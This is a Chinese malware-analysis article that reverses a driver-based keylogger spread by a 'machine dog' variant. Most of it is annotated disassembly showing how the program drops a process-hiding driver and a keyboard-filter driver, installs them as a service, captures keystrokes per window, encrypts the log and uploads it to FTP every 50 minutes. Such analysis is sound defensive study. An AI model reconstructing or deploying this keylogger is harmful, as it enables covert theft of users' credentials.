

# 逆向一个基于驱动的恶意程序

> 原文：[`www.pediy.com/kssd/pediy10/61643.html`](https://www.pediy.com/kssd/pediy10/61643.html)

本程序发现于机器狗变种病毒释放恶意程序的下载列表中:穿透还原系统后的机器狗病毒在  
机器启动后会从指定网址下载多个恶意程序，本程序即其中之一，其功能为通过底层键盘过滤  
方式盗取用户键盘输入信息。因程序使用了底层键盘过滤技术，故而可记录大部分软件的键盘  
输入，包括网游、QQ、邮箱的帐户输入信息等。  
   
**一、原理：**  
   
    此程序随系统进程 internat.exe 启动而被执行，程序通过加载自身资源里的两个驱动来隐  
藏自身进程并截获键盘输入；通过自身线程与前端窗口线程输入绑定来监视窗口句柄及控件焦  
点的变化情况，如发现变化则向驱动请求键盘输入扫描码数据，并对得到的扫描数据做解码、  
加密、存盘操作；每隔 50 分钟程序会将按键记录文件上传到指定 ftp 服务器。  
   
**二、说明：**  
   
    1、本文提供的逆向代码均可编译，为调试方便，主程序逆向的 C 代码去除了定时上传和记  
录加密部分（保留汇编代码注释），本地生成的记录文件改随机文件名为当前目录固定文件  
名：kblog.txt；  
    2、使用 OD 跟踪可以很容易的从资源中分离出的两个驱动：msdtx.sys 和 kdbrv.sys。(附件  
下载)   msdtx.sys 用于自身进程隐藏，经分析其采用的是 fuzen 开源代码(附件下载)，本文不  
做讨论。kbdrv.sys 为键盘过滤驱动，本文给出其基本流程，并给出 IDA 反汇编代码的详细注  
释。(附件下载)  
    3、驱动逆向以 hexrays 生成的伪代码为中心，尝试以最少的改动来实现伪代码(附件下载)  
的编译;  
    4、主程序逆向的 C 代码(见 KBLOG\_C 目录)使用的编译环境为 VC6.0，通过此编译环境对驱动  
的替换可以验证逆向出来的驱动代码是否正确。  
   
**三、流程**  
   
主程序 kblog.exe 基本流程：  
   
1、释放、加载、启动隐藏自身进程的驱动。  
2、释放、加载、启动键盘过滤驱动服务。  
3、绑定自身线程输入到前端窗口线程输入。  
4、监视前端窗口句柄和当前焦点控件句柄。  
   如有变化，则向驱动请求数据，并保存数据。  
5、每隔 50 分钟向指定 ftp 上传加密过的键盘记录。  
   
说明：  
   
    1、在没有安装过还原系统的机器上重复运行此程序会导致蓝屏，这是因为加载的驱动没有  
做卸载处理、重复加载所致而对安装了还原系统的机器则不存在此问题，所以这种加载方式应  
该是针对安装了还原系统的网吧设计。  
    2、本地生成的记录文件名是随机的，上传到 FTP 的记录文件被重新命名，FTP 目录  
cert\\cnt\\中以数字文件名的形式设置了一个文件记数器，每次上传后此记数器加 1，同时保存  
到 FTP 中的文件名会以此记数器的当前数字来命名。记录文件上传后本地记录文件即被删除。  
   
以下为主程序 kblog.exe 的代码注释：  
   
\------------------------------------------------------;主程序入口---------------------------  
00401B39 >push    ebp  
00401B3A  mov     ebp,esp  
00401B3C  push    -1  
00401B3E  push    00402681                            ;  SE 处理程序安装  
00401B43  mov     eax,fs:\[0\]  
00401B49  push    eax  
00401B4A  mov     fs:\[0\],esp  
00401B51  sub     esp,0AC0  
00401B57  mov     dword ptr \[ebp-AC4\],0  
00401B61  mov     dword ptr \[ebp-6BC\],0  
00401B6B  mov     dword ptr \[ebp-398\],0  
00401B75  mov     dword ptr \[ebp-4A4\],0  
00401B7F  mov     dword ptr \[ebp-5B0\],0  
00401B89  mov     dword ptr \[ebp-218\],0  
00401B93  mov     dword ptr \[ebp-5AC\],0  
\------------------------------------------------------;  建立流文件对象--------------------------  
00401B9D  push    1  
00401B9F  lea     ecx,\[ebp-84\]  
00401BA5  call    \[<&MSVCIRT.fstream::fstream>\]       ;  MSVCIRT.fstream::fstream  
00401BAB  mov     dword ptr \[ebp-4\],0  
00401BB2  push    1  
00401BB4  lea     ecx,\[ebp-380\]  
00401BBA  call    \[<&MSVCIRT.fstream::fstream>\]       ;  MSVCIRT.fstream::fstream  
00401BC0  mov     byte ptr \[ebp-4\],1  
\-----------------------------------------------------------------------------------------------  
00401BC4  mov     dword ptr \[ebp-31C\],004042D0        ;  ASCII "\\kbdrv.sys" 键盘过滤驱动文件名  
00401BCE  mov     dword ptr \[ebp-20\],004042DC         ;  ASCII "\\msdtx.sys" 隐藏进程驱动文件名  
00401BD5  mov     dword ptr \[ebp-14\],0  
00401BDC  mov     dword ptr \[ebp-38C\],0  
00401BE6  mov     dword ptr \[ebp-39C\],0  
00401BF0  mov     dword ptr \[ebp-10\],0  
00401BF7  call    004012B0                            ;  检测是否具备 administrator 权限  
00401BFC  mov     \[ebp-38C\],eax  
00401C02  cmp     dword ptr \[ebp-38C\],0  
00401C09  jnz     short 00401C10                      ;  如具备权限则跳转  
00401C0B  jmp     004023B0                            ;  否则返回（释放流文件对象并退出）  
00401C10  push    0  
00401C12  call    \[<&KERNEL32.GetModuleHandleA>\]      ;  KERNEL32.GetModuleHandleA  
00401C18  mov     \[ebp-18\],eax  
00401C1B  lea     eax,\[ebp-49C\]  
\------------------------------------------------------;  定位并加载隐藏进程的驱动文件--------------  
00401C21  push    eax  
00401C22  push    100  
00401C27  call    \[<&KERNEL32.GetCurrentDirectoryA>\]  ;  KERNEL32.GetCurrentDirectoryA  
00401C2D  mov     ecx,\[ebp-20\]  
00401C30  push    ecx  
00401C31  lea     edx,\[ebp-49C\]  
00401C37  push    edx  
00401C38  call    <jmp.&MSVCRT.strcat>                ;  带路径的驱动文件名  
00401C3D  add     esp,8  
00401C40  lea     eax,\[ebp-49C\]  
00401C46  mov     \[40455C\],eax  
00401C4B  push    004042E8                            ;  ASCII "sys"  
00401C50  push    6A  
00401C52  mov     ecx,\[ebp-18\]  
00401C55  push    ecx                                 ;   
00401C56  call    \[<&KERNEL32.FindResourceA>\]         ;  KERNEL32.FindResourceA 在资源中定位  
00401C5C  mov     \[ebp-390\],eax  
00401C62  cmp     dword ptr \[ebp-390\],0                 
00401C69  jnz     short 00401C70                      ;  如定位成功则跳转  
00401C6B  jmp     004023B0                            ;  否则返回   
00401C70  mov     edx,\[ebp-390\]  
00401C76  push    edx  
00401C77  mov     eax,\[ebp-18\]  
00401C7A  push    eax  
00401C7B  call    \[<&KERNEL32.LoadResource>\]          ;  KERNEL32.LoadResource 加载至内存  
00401C81  mov     \[ebp-6B8\],eax  
00401C87  cmp     dword ptr \[ebp-6B8\],0  
00401C8E  jnz     short 00401C95                      ;  如加载成功则跳转  
00401C90  jmp     004023B0                            ;  否则返回  
\------------------------------------------------------;  生成驱动文件 msdtx.sys（用于隐藏自身进程）-------  
00401C95  mov     ecx,\[ebp-6B8\]  
00401C9B  push    ecx  
00401C9C  call    \[<&KERNEL32.LockResource>\]          ;  KERNEL32.SetHandleCount 设置可用句柄  
00401CA2  mov     \[ebp-1C\],eax  
00401CA5  cmp     dword ptr \[ebp-1C\],0  
00401CA9  jnz     short 00401CB0                      ;  如设置成功则跳转  
00401CAB  jmp     004023B0                            ;  否则返回  
00401CB0  mov     edx,\[ebp-390\]  
00401CB6  push    edx  
00401CB7  mov     eax,\[ebp-18\]  
00401CBA  push    eax  
00401CBB  call    \[<&KERNEL32.SizeofResource>\]        ;  KERNEL32.SizeofResource 资源尺寸  
00401CC1  mov     \[ebp-4A0\],eax  
00401CC7  mov     ecx,\[<&MSVCIRT.filebuf::openprot>\]  ;  MSVCIRT.filebuf::openprot  
00401CCD  mov     edx,\[ecx\]  
00401CCF  push    edx  
00401CD0  push    8A  
00401CD5  mov     eax,\[40455C\]  
00401CDA  push    eax  
00401CDB  lea     ecx,\[ebp-380\]  
00401CE1  call    \[<&MSVCIRT.fstream::open>\]          ;  打开用于建立文件  
00401CE7  mov     ecx,\[ebp-380\]  
00401CED  mov     edx,\[ecx+4\]  
00401CF0  lea     ecx,\[ebp+edx-380\]  
00401CF7  call    \[<&MSVCIRT.ios::fail>\]              ;  MSVCIRT.ios::fail   
00401CFD  test    eax,eax  
00401CFF  je      short 00401D06                      ;  如打开成功 则跳转  
00401D01  jmp     004023B0                            ;  否则返回  
00401D06  mov     eax,\[ebp-4A0\]  
00401D0C  push    eax  
00401D0D  mov     ecx,\[ebp-1C\]  
00401D10  push    ecx  
00401D11  lea     ecx,\[ebp-374\]  
00401D17  call    \[<&MSVCIRT.ostream::write>\]         ;  MSVCIRT.ostream::write 写入文件  
00401D1D  lea     ecx,\[ebp-380\]  
00401D23  call    \[<&MSVCIRT.fstream::close>\]         ;  MSVCIRT.fstream::close 关闭文件  
\------------------------------------------------------;  初始化驱动并隐藏自身进程----------------  
00401D29  call    004023F1                            ;  初始化驱动  
00401D2E  cmp     eax,-1  
00401D31  jnz     short 00401D45                      ;  初始化成功则跳转  
00401D33  mov     edx,\[40455C\]                        ;  否则删除驱动文件并返回  
00401D39  push    edx  
00401D3A  call    \[<&KERNEL32.DeleteFileA>\]           ;  KERNEL32.DeleteFileA  
00401D40  jmp     004023B0  
00401D45  call    \[<&MSVCRT.\_getpid>\]                 ;  MSVCRT.\_getpid 得到自身进程 PID  
00401D4B  mov     \[ebp-384\],eax  
00401D51  mov     eax,\[ebp-384\]  
00401D57  push    eax  
00401D58  call    004025A3                            ;  隐藏自身进程   
00401D5D  add     esp,4  
00401D60  mov     \[ebp-6B4\],eax  
00401D66  cmp     dword ptr \[ebp-6B4\],0  
00401D6D  jnz     short 00401D81                      ;  隐藏成功则跳转  
00401D6F  mov     ecx,\[40455C\]                        ;  否则删除文件并返回  
00401D75  push    ecx  
00401D76  call    \[<&KERNEL32.DeleteFileA>\]           ;  KERNEL32.DeleteFileA  
00401D7C  jmp     004023B0  
00401D81  mov     edx,\[40455C\]  
00401D87  push    edx                                 ;   
00401D88  call    \[<&KERNEL32.DeleteFileA>\]           ;  KERNEL32.DeleteFileA  
\------------------------------------------------------;  定位并加载键盘过滤的驱动文件--------------  
00401D8E  lea     eax,\[ebp-49C\]  
00401D94  push    eax  
00401D95  push    100  
00401D9A  call    \[<&KERNEL32.GetCurrentDirectoryA>\]  ;  KERNEL32.GetCurrentDirectoryA  
00401DA0  mov     ecx,\[ebp-31C\]  
00401DA6  push    ecx  
00401DA7  lea     edx,\[ebp-49C\]  
00401DAD  push    edx  
00401DAE  call    <jmp.&MSVCRT.strcat>                ;  带路径的驱动文件名  
00401DB3  add     esp,8  
00401DB6  lea     eax,\[ebp-49C\]  
00401DBC  mov     \[40455C\],eax  
00401DC1  push    004042EC                            ;  ASCII "sys"  
00401DC6  push    69  
00401DC8  mov     ecx,\[ebp-18\]  
00401DCB  push    ecx  
00401DCC  call    \[<&KERNEL32.FindResourceA>\]         ;  KERNEL32.FindResourceA 定位  
00401DD2  mov     \[ebp-390\],eax  
00401DD8  cmp     dword ptr \[ebp-390\],0  
00401DDF  jnz     short 00401DE6                      ;  如定位成功则跳转  
00401DE1  jmp     004023B0                            ;  否则返回  
00401DE6  mov     edx,\[ebp-390\]  
00401DEC  push    edx  
00401DED  mov     eax,\[ebp-18\]  
00401DF0  push    eax  
00401DF1  call    \[<&KERNEL32.LoadResource>\]          ;  KERNEL32.LoadResource 加载至内存  
00401DF7  mov     \[ebp-6B8\],eax  
00401DFD  cmp     dword ptr \[ebp-6B8\],0  
00401E04  jnz     short 00401E0B                      ;  如加载成功则跳转  
00401E06  jmp     004023B0                            ;  否则返回   
\------------------------------------------------------;  生成驱动文件 kbdrv.sys（用于键盘过滤）--------------  
00401E0B  mov     ecx,\[ebp-6B8\]  
00401E11  push    ecx  
00401E12  call    \[<&KERNEL32.LockResource>\]          ;  KERNEL32.SetHandleCount 设置可用句柄  
00401E18  mov     \[ebp-1C\],eax  
00401E1B  cmp     dword ptr \[ebp-1C\],0  
00401E1F  jnz     short 00401E26                      ;  如设置成功则跳转  
00401E21  jmp     004023B0                            ;  否则返回   
00401E26  mov     edx,\[ebp-390\]  
00401E2C  push    edx  
00401E2D  mov     eax,\[ebp-18\]  
00401E30  push    eax  
00401E31  call    \[<&KERNEL32.SizeofResource>\]        ;  KERNEL32.SizeofResource 资源尺寸  
00401E37  mov     \[ebp-4A0\],eax  
00401E3D  mov     ecx,\[<&MSVCIRT.filebuf::openprot>\]  ;  MSVCIRT.filebuf::openprot  
00401E43  mov     edx,\[ecx\]  
00401E45  push    edx  
00401E46  push    8A  
00401E4B  mov     eax,\[40455C\]  
00401E50  push    eax  
00401E51  lea     ecx,\[ebp-380\]  
00401E57  call    \[<&MSVCIRT.fstream::open>\]          ;  打开用于建立文件  
00401E5D  mov     ecx,\[ebp-380\]  
00401E63  mov     edx,\[ecx+4\]  
00401E66  lea     ecx,\[ebp+edx-380\]  
00401E6D  call    \[<&MSVCIRT.ios::fail>\]              ;  MSVCIRT.ios::fail  
00401E73  test    eax,eax  
00401E75  je      short 00401E7C                      ;  如打开成功 则跳转  
00401E77  jmp     004023B0                            ;  否则返回   
00401E7C  mov     eax,\[ebp-4A0\]  
00401E82  push    eax  
00401E83  mov     ecx,\[ebp-1C\]  
00401E86  push    ecx  
00401E87  lea     ecx,\[ebp-374\]  
00401E8D  call    \[<&MSVCIRT.ostream::write>\]         ;  MSVCIRT.ostream::write 写入文件  
00401E93  lea     ecx,\[ebp-380\]   
00401E99  call    \[<&MSVCIRT.fstream::close>\]         ;  MSVCIRT.fstream::close 关闭文件  
\------------------------------------------------------;  安装并启动服务----------------------------  
00401E9F  push    0F003F  
00401EA4  push    0  
00401EA6  push    0  
00401EA8  call    \[<&ADVAPI32.OpenSCManagerA>\]        ;  打开服务控制管理器  
00401EAE  mov     \[ebp-14\],eax  
00401EB1  cmp     dword ptr \[ebp-14\],0  
00401EB5  jnz     short 00401EC9                      ;  如打开成功 则跳转  
00401EB7  mov     edx,\[40455C\]                        ;  否则删除文件并返回  
00401EBD  push    edx  
00401EBE  call    \[<&KERNEL32.DeleteFileA>\]           ;  KERNEL32.DeleteFileA  
00401EC4  jmp     004023B0  
00401EC9  mov     eax,\[40455C\]  
00401ECE  push    eax  
00401ECF  mov     ecx,\[404260\]                        ;    
00401ED5  push    ecx  
00401ED6  mov     edx,\[ebp-14\]  
00401ED9  push    edx  
00401EDA  call    004013EC                            ;  安装服务  
00401EDF  add     esp,0C  
00401EE2  mov     \[ebp-38C\],eax  
00401EE8  cmp     dword ptr \[ebp-38C\],0  
00401EEF  jnz     short 00401F02                      ;  安装成功则跳转   
00401EF1  mov     eax,\[40455C\]                        ;  否则删除文件并返回  
00401EF6  push    eax  
00401EF7  call    \[<&KERNEL32.DeleteFileA>\]           ;  KERNEL32.DeleteFileA  
00401EFD  jmp     004023B0  
00401F02  mov     ecx,\[404260\]                        ;  kblog.00404264  
00401F08  push    ecx  
00401F09  mov     edx,\[ebp-14\]  
00401F0C  push    edx                                 ;   
00401F0D  call    0040143B                            ;  启动服务  
00401F12  add     esp,8                               ;   
00401F15  mov     \[ebp-38C\],eax  
00401F1B  cmp     dword ptr \[ebp-38C\],0  
00401F22  jnz     short 00401F35                      ;  启动成功则跳转   
00401F24  mov     eax,\[40455C\]                        ;  否则删除文件并返回  
00401F29  push    eax  
00401F2A  call    \[<&KERNEL32.DeleteFileA>\]           ;  KERNEL32.DeleteFileA  
00401F30  jmp     004023B0                            ;   
00401F35  mov     ecx,\[40455C\]  
00401F3B  push    ecx  
00401F3C  call    \[<&KERNEL32.DeleteFileA>\]           ;  KERNEL32.DeleteFileA  
\------------------------------------------------------;  初始化记录文件路径和临时文件名---  
00401F42  push    100  
00401F47  push    0  
00401F49  lea     edx,\[ebp-6B0\]  
00401F4F  push    edx  
00401F50  call    <jmp.&MSVCRT.memset>                ;  路径串清空  
00401F55  add     esp,0C  
00401F58  lea     eax,\[ebp-6B0\]  
00401F5E  push    eax  
00401F5F  push    100  
00401F64  call    \[<&KERNEL32.GetTempPathA>\]          ;  KERNEL32.GetTempPathA 得到 Temp 路径  
00401F6A  push    100  
00401F6F  push    0  
00401F71  lea     ecx,\[ebp-5A8\]  
00401F77  push    ecx  
00401F78  call    <jmp.&MSVCRT.memset>                ; 文件名串清空  
00401F7D  add     esp,0C  
00401F80  lea     edx,\[ebp-5A8\]  
00401F86  push    edx  
00401F87  push    0  
00401F89  push    0                                     
00401F8B  lea     eax,\[ebp-6B0\]  
00401F91  push    eax  
00401F92  call    \[<&KERNEL32.GetTempFileNameA>\]      ;  KERNEL32.GetTempFileNameA 得到文件名  
00401F98  lea     ecx,\[ebp-214\]  
00401F9E  push    ecx  
00401F9F  push    2  
00401FA1  call    \[<&WS2\_32.#115>\]                    ;  WS2\_32.WSAStartup Socket 初始化  
00401FA7  test    eax,eax  
00401FA9  jnz     00402053                            ;  初始化不成功则跳转  
\------------------------------------------------------;  记录计算机名和 IP------------------------------  
00401FAF  push    100                                 ;  
00401FB4  lea     edx,\[ebp-318\]  
00401FBA  push    edx  
00401FBB  call    \[<&WS2\_32.#57>\]                     ;  WS2\_32.gethostname 得到主机名  
00401FC1  test    eax,eax  
00401FC3  jnz     0040204D                            ;  没得到则跳转  
00401FC9  lea     eax,\[ebp-318\]  
00401FCF  push    eax  
00401FD0  call    \[<&WS2\_32.#52>\]                     ;  WS2\_32.gethostbyname 得到主机信息  
00401FD6  mov     \[ebp-394\],eax  
00401FDC  cmp     dword ptr \[ebp-394\],0               ;   
00401FE3  je      short 0040204D                      ;  没得到则跳转  
00401FE5  mov     ecx,\[ebp-394\]  
00401FEB  mov     edx,\[ecx+C\]  
00401FEE  mov     eax,\[edx\]  
00401FF0  mov     ecx,\[eax\]  
00401FF2  push    ecx  
00401FF3  call    \[<&WS2\_32.#12>\]                     ;  WS2\_32.inet\_ntoa 得到主机 IP  
00401FF9  mov     \[ebp-4A8\],eax  
00401FFF  push    004042F0                            ;  ASCII "---"  记录格式  
00402004  lea     edx,\[ebp-318\]  
0040200A  push    edx  
0040200B  call    \[<&KERNEL32.lstrcatA>\]              ;  KERNEL32.lstrcatA  
00402011  mov     eax,\[ebp-4A8\]  
00402017  push    eax  
00402018  lea     ecx,\[ebp-318\]  
0040201E  push    ecx  
0040201F  call    \[<&KERNEL32.lstrcatA>\]              ;  KERNEL32.lstrcatA  
00402025  push    004042F4  
0040202A  lea     edx,\[ebp-318\]                       ;   
00402030  push    edx  
00402031  call    \[<&KERNEL32.lstrcatA>\]              ;  KERNEL32.lstrcatA  
00402037  lea     eax,\[ebp-5A8\]  
0040203D  push    eax  
0040203E  lea     ecx,\[ebp-318\]  
00402044  push    ecx  
00402045  call    004015A9                            ;  记录主机名及 IP  
0040204A  add     esp,8  
\---------------------------------------------------------------------------------------------------------  
0040204D  call    \[<&WS2\_32.#116>\]                    ;  WS2\_32.WSACleanup 清除 Socket  
00402053  push    0  
00402055  push    80  
0040205A  push    3  
0040205C  push    0  
0040205E  push    0  
00402060  push    C0000000  
00402065  push    004042F8                            ;  ASCII "\\\\.\\kbdev"  
0040206A  call    \[<&KERNEL32.CreateFileA>\]           ;  KERNEL32.CreateFileA 建立与键盘过滤驱动的连接  
00402070  mov     \[ebp-10\],eax  
00402073  cmp     dword ptr \[ebp-10\],-1  
00402077  je      0040234C                            ;  连接失败则跳转  
0040207D  call    \[<&KERNEL32.GetCurrentThreadId>\]    ;  KERNEL32.GetCurrentThreadId 得到当前线程 ID  
00402083  mov     \[ebp-398\],eax  
00402089  call    \[<&KERNEL32.GetTickCount>\]          ;  KERNEL32.GetTickCount 得到启动到现在经历的毫秒数  
0040208F  mov     \[ebp-388\],eax  
00402095  mov     edx,1                               ;  循环 while(TRUE) 至 00402347  
0040209A  test    edx,edx  
0040209C  je      0040234C                            ;  edx 为 0 则跳出循环   
004020A2  call    \[<&USER32.GetForegroundWindow>\]     ;  USER32.GetForegroundWindow 获得前端窗口句柄  
004020A8  mov     \[ebp-AC4\],eax                       ;  前端窗口句柄存于\[ebp-AC4\]  
004020AE  call    \[<&USER32.GetFocus>\]                ;  USER32.GetFocus 获得前端焦点控件句柄  
004020B4  mov     \[ebp-218\],eax  
004020BA  call    \[<&KERNEL32.GetTickCount>\]          ;  KERNEL32.GetTickCount 得到启动到现在经历的毫秒数  
004020C0  mov     \[ebp-6C0\],eax  
004020C6  mov     eax,\[ebp-6C0\]  
004020CC  sub     eax,\[ebp-388\]                       ;  两次经历的时间差  
004020D2  cmp     eax,2DC6C0  
004020D7  jb      00402168                            ;  如果少于 50 分钟则跳转  
004020DD  lea     ecx,\[ebp-5A8\]                       ;  否则上传 ftp  
004020E3  push    ecx  
004020E4  call    00401719                            ;  
004020E9  add     esp,4  
004020EC  test    eax,eax  
004020EE  je      short 0040215C                      ;  上传失败则跳转   
\------------------------------------------------------;  上传成功则初始化记录文件路径和----------------------  
\------------------------------------------------------;  临时文件名并重新记录主机名和 IP----------------------  
004020F0  push    100  
004020F5  push    0  
004020F7  lea     edx,\[ebp-6B0\]  
004020FD  push    edx  
004020FE  call    <jmp.&MSVCRT.memset>  
00402103  add     esp,0C  
00402106  lea     eax,\[ebp-6B0\]  
0040210C  push    eax  
0040210D  push    100  
00402112  call    \[<&KERNEL32.GetTempPathA>\]          ;  KERNEL32.GetTempPathA  
00402118  push    100  
0040211D  push    0  
0040211F  lea     ecx,\[ebp-5A8\]  
00402125  push    ecx  
00402126  call    <jmp.&MSVCRT.memset>  
0040212B  add     esp,0C  
0040212E  lea     edx,\[ebp-5A8\]  
00402134  push    edx  
00402135  push    0  
00402137  push    0  
00402139  lea     eax,\[ebp-6B0\]                       ; |Arg2 => 00404264 ASCII "kbdrv"  
0040213F  push    eax  
00402140  call    \[<&KERNEL32.GetTempFileNameA>\]      ;  KERNEL32.GetTempFileNameA  
00402146  lea     ecx,\[ebp-5A8\]  
0040214C  push    ecx  
0040214D  lea     edx,\[ebp-318\]  
00402153  push    edx  
00402154  call    004015A9  
00402159  add     esp,8  
\---------------------------------------------------------------------------------------------------------  
0040215C  call    \[<&KERNEL32.GetTickCount>\]          ;  KERNEL32.GetTickCount 经历秒数  
00402162  mov     \[ebp-388\],eax  
00402168  mov     eax,\[ebp-AC4\]                       ;  前端的窗口句柄  
0040216E  cmp     eax,\[ebp-6BC\]                       ;  00402327 处记忆的原前端窗口句柄  
00402174  je      short 004021C5                      ;  两句柄比较相等则转(前端窗口没变)  
00402176  cmp     dword ptr \[ebp-4A4\],0  
0040217D  je      short 00402195                      ;  如\[ebp-4A4\]线程 ID 为空则跳转  
0040217F  push    0                                   ;  否则将当前线程绑定到前端窗口线程的输入   
00402181  mov     ecx,\[ebp-4A4\]  
00402187  push    ecx  
00402188  mov     edx,\[ebp-398\]  
0040218E  push    edx  
0040218F  call    \[<&USER32.AttachThreadInput>\]       ;  USER32.AttachThreadInput  
00402195  lea     eax,\[ebp-5B0\]  
0040219B  push    eax  
0040219C  mov     ecx,\[ebp-AC4\]  
004021A2  push    ecx  
004021A3  call    \[<&USER32.GetWindowThreadProcessId>>;  得到前端窗口线程 ID  
004021A9  mov     \[ebp-4A4\],eax  
004021AF  push    1  
004021B1  mov     edx,\[ebp-4A4\]  
004021B7  push    edx  
004021B8  mov     eax,\[ebp-398\]  
004021BE  push    eax  
004021BF  call    \[<&USER32.AttachThreadInput>\]       ;  将当前线程绑定到前端窗口线程的输入  
004021C5  cmp     dword ptr \[ebp-AC4\],0  
004021CC  je      004022F9                            ;  如前端窗口句柄不空  
004021D2  push    100                                 ;  得到窗口名  
004021D7  push    00404564  
004021DC  mov     ecx,\[ebp-AC4\]  
004021E2  push    ecx  
004021E3  call    \[<&USER32.GetWindowTextA>\]          ;  USER32.GetWindowTextA  
004021E9  mov     edx,1  
004021EE  test    edx,edx  
004021F0  je      004022F9                            ;    
004021F6  mov     eax,\[ebp-AC4\]  
004021FC  cmp     eax,\[ebp-6BC\]  
00402202  jnz     short 0040223B                      ;  如前端窗口改变则跳转  
00402204  mov     ecx,\[ebp-218\]  
0040220A  cmp     ecx,\[ebp-5AC\]  
00402210  je      short 0040223B                      ;  如前端控件焦点没改变则跳转  
00402212  push    0  
00402214  lea     edx,\[ebp-39C\]  
0040221A  push    edx                                 ;   
0040221B  push    0  
0040221D  push    0  
0040221F  push    0  
00402221  push    0  
00402223  push    80102187                            ;  IoControlCode 控制码  
00402228  mov     eax,\[ebp-10\]                        ; /Buffer  
0040222B  push    eax  
0040222C  call    \[<&KERNEL32.DeviceIoControl>\]       ;  发 IO 请求，扫描码中加入换行标志  
00402232  test    eax,eax  
00402234  jnz     short 0040223B                      ;  请求成功则跳转  
00402236  jmp     0040234C                            ;  否则跳转  
0040223B  mov     ecx,\[ebp-AC4\]                       ;   
00402241  cmp     ecx,\[ebp-6BC\]                       ;   
00402247  je      004022F9                            ;  如前端窗口没改变则跳转  
0040224D  push    0                                   ;  否则发送驱动 IO 请求  
0040224F  lea     edx,\[ebp-39C\]  
00402255  push    edx                                 ;   
00402256  push    400  
0040225B  lea     eax,\[ebp-AC0\]                       ;   
00402261  push    eax  
00402262  push    400  
00402267  lea     ecx,\[ebp-AC0\]  
0040226D  push    ecx  
0040226E  push    80102184  
00402273  mov     edx,\[ebp-10\]  
00402276  push    edx  
00402277  call    \[<&KERNEL32.DeviceIoControl>\]       ;  发 IO 请求，从驱动中返回的键盘扫描码数据  
0040227D  test    eax,eax  
0040227F  jnz     short 00402286                      ;  请求成功则跳转  
00402281  jmp     0040234C                            ;  否则跳转  
00402286  mov     eax,\[ebp-AC0\]                       ;  返回数据保存在：\[ebp-AC0\]  
0040228C  and     eax,0FFFF  
00402291  test    eax,eax  
00402293  je      short 004022F9                      ;  如返回的键盘数据为空(第一个值为 0)  
00402295  lea     ecx,\[ebp-5A8\]  
0040229B  push    ecx  
0040229C  push    00404664  
004022A1  call    004015A9                            ;  存原窗口名到记录文件  
004022A6  add     esp,8  
004022A9  lea     edx,\[ebp-5A8\]  
004022AF  push    edx  
004022B0  push    00404304                            ;  ASCII CR,LF  
004022B5  call    004015A9                            ;  存换行符到记录文件    
004022BA  add     esp,8  
004022BD  lea     eax,\[ebp-5A8\]  
004022C3  push    eax  
004022C4  lea     ecx,\[ebp-AC0\]  
004022CA  push    ecx  
004022CB  call    004014BA                            ;  转换键盘扫描码数据  
004022D0  add     esp,8  
004022D3  push    0  
004022D5  lea     edx,\[ebp-39C\]                       ;   
004022DB  push    edx  
004022DC  push    0  
004022DE  push    0  
004022E0  push    0  
004022E2  push    0                                   ;   
004022E4  push    80102180  
004022E9  mov     eax,\[ebp-10\]                        ;   
004022EC  push    eax  
004022ED  call    \[<&KERNEL32.DeviceIoControl>\]       ;  发 IO 请求，清驱动内扫描码缓冲区  
004022F3  test    eax,eax  
004022F5  jnz     short 004022F9                      ;  请求成功则跳转  
004022F7  jmp     short 0040234C                      ;  否则跳转  
004022F9  mov     ecx,\[ebp-5AC\]  
004022FF  cmp     ecx,\[ebp-218\]  
00402305  je      short 00402313                      ;  如前端控件焦点没改变则跳转  
00402307  mov     edx,\[ebp-218\]                       ;  否则保存前端控件焦点句柄  
0040230D  mov     \[ebp-5AC\],edx  
00402313  mov     eax,\[ebp-AC4\]  
00402319  cmp     eax,\[ebp-6BC\]  
0040231F  je      short 0040233F                      ;  如前端窗口没改变则跳转   
00402321  mov     ecx,\[ebp-AC4\]                       ;  保存前端窗口句柄  
00402327  mov     \[ebp-6BC\],ecx  
0040232D  push    00404564  
00402332  push    00404664  
00402337  call    <jmp.&MSVCRT.strcpy>                ;  保存改变后前端窗口名  
0040233C  add     esp,8  
0040233F  push    1  
00402341  call    \[<&KERNEL32.Sleep>\]                 ;  KERNEL32.Sleep  
00402347  jmp     00402095                            ;  转到循环开始处  
0040234C  cmp     dword ptr \[ebp-4A4\],0  
00402353  je      short 0040236B                      ;  如当前窗口线程为空则跳转  
00402355  push    0                                   ;  否则卸载线程绑定  
00402357  mov     edx,\[ebp-4A4\]  
0040235D  push    edx  
0040235E  mov     eax,\[ebp-398\]  
00402364  |push    eax  
00402365  call    \[<&USER32.AttachThreadInput>\]       ;  USER32.AttachThreadInput   
0040236B  cmp     dword ptr \[ebp-10\],0  
0040236F  je      short 0040237B                      ;  如驱动设备句柄为空则跳转  
00402371  mov     ecx,\[ebp-10\]                        ;  否则关闭句柄   
00402374  push    ecx  
00402375  call    \[<&KERNEL32.CloseHandle>\]           ;  KERNEL32.CloseHandle  
\------------------------------------------------------;  释放两个流文件对象 返回值 0-----------------------------------  
0040237B  mov     dword ptr \[ebp-AC8\],0  
00402385  mov     byte ptr \[ebp-4\],0  
00402389  lea     ecx,\[ebp-380\]  
0040238F  call    \[<&MSVCIRT.fstream::\`vbase destruct>;  MSVCIRT.fstream::\`vbase destructor'  
00402395  mov     dword ptr \[ebp-4\],-1  
0040239C  |lea     ecx,\[ebp-84\]  
004023A2  call    \[<&MSVCIRT.fstream::\`vbase destruct>;  MSVCIRT.fstream::\`vbase destructor'  
004023A8  mov     eax,\[ebp-AC8\]  
004023AE  |jmp     short 004023E3                     ; \\kblog.00401719  
\------------------------------------------------------;  释放两个流文件对象 返回值-1-----------------------------------  
004023B0  mov     dword ptr \[ebp-ACC\],-1  
004023BA  |mov     byte ptr \[ebp-4\],0                 ;   
004023BE  lea     ecx,\[ebp-380\]  
004023C4  call    \[<&MSVCIRT.fstream::\`vbase destruct>;  MSVCIRT.fstream::\`vbase destructor'  
004023CA  mov     dword ptr \[ebp-4\],-1  
004023D1  lea     ecx,\[ebp-84\]  
004023D7  |call    \[<&MSVCIRT.fstream::\`vbase destruc>;  MSVCIRT.fstream::\`vbase destructor'  
004023DD  mov     eax,\[ebp-ACC\]  
004023E3  mov     ecx,\[ebp-C\]  
004023E6  mov     fs:\[0\],ecx  
004023ED  mov     esp,ebp  
004023EF  |pop     ebp                                ;   
004023F0  |retn                                       ;   
\---------------------------------------------------------------------------------------------------------  
键盘记录加密保存函数：(sub\_4015A9)  
1、此函数功能为对指定的字串先加密后保存到文件中。  
2、加密过程为逐个字符与通过计算从加密字符集中动态取出的字符进行异或运算。  
